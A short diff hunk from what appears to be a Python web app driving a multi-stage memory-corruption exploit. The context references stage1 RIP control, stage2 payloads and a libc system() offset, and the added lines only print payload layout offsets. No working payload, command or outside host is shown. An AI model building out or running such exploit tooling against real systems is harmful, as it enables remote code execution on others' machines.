@@ -8211,6 +8211,15 @@ def create_app(api: SAPMAPApi) -> Bottle:
                                      system_libc_off=sy_off,
                                      stage2_disp_rdi=s2_disp_rdi,
                                      stage2_b_off=s2_b_off)
+            _lay = res.get("tail_layout") or {}
+            if _lay:
+                print(f"[*] {sid}: tail layout — "
+                      f"OFF_A={_lay.get('off_a', 0):#x}, "
+                      f"OFF_B={_lay.get('off_b', 0):#x}, "
+                      f"OFF_CMD={_lay.get('off_cmd', 0):#x}, "
+                      f"size={_lay.get('size', 0):#x} — "
+                      f"disp_rdi={_lay.get('disp_rdi', 0):#x}, "
+                      f"b_off={_lay.get('b_off', 0):#x}")
             print(f"[*] {sid}: payload {res['passport_len']}B, "
                   f"stage1 RIP {res['stage1']:#x}, "
                   f"stage2 {res['stage2']:#x}, "
